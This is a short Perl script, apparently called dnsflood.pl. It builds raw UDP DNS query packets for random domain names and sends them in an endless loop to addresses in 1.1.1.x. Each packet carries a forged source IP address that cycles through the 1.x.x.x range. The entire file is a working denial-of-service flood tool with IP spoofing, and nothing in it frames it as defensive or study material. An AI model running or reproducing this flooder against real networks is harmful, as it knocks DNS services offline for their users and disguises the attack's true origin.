#!/usr/bin/perl

use Net::DNS::Resolver;
use Net::RawIP;
use strict;

#if ($ARGV[0] eq '') {
#    print "Usage: dnsflood.pl <ip address>\n";
#    exit(0);
#}

#print ("attacked: $ARGV[0]...\n");

my @abc = ("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y",
"z");
my @domains = ("com", "org", "net"); # ...
my $str = @abc[int rand(25)];
my $name;
my $src_ip;
my $count=0;

my $max=2;
my $dst_ip="1.1.1.1";


for (my $i=1; $i <= $max; $i++) {
 if ($i==$max) {
 $i=1;
}
  for (my $j=1; $j<255; $j++) {
    for (my $k=1; $k<255;$k++) { 

    $str = @abc[int rand(9)];
    $str .= @abc[int rand(25)];
    $name = $str . "." . @domains[int rand(3)];
    $src_ip = "1" . "." . $i . "." . $j . "." . $k ;

    $dst_ip = "1" . "." ."1"  . "."  . "1"  . "." . int(rand(255))  ; 

    # Make DNS packet
    my $dnspacket = new Net::DNS::Packet($name, "A");
    my $dnsdata = $dnspacket->data;
    my $sock = new Net::RawIP({udp=>{}});

    # send packet
    $count+=1;
    print ("Send packet seq=$count, src_ip=$src_ip,daddr=$dst_ip\n"); 
    $sock->set({ip => {
                saddr => $src_ip, daddr => $dst_ip, frag_off=>0,tos=>0,id=>1565},
                udp => {source => 53,
                dest => 53, data=>$dnsdata
                } });
    $sock->send;
}}}

exit(0);



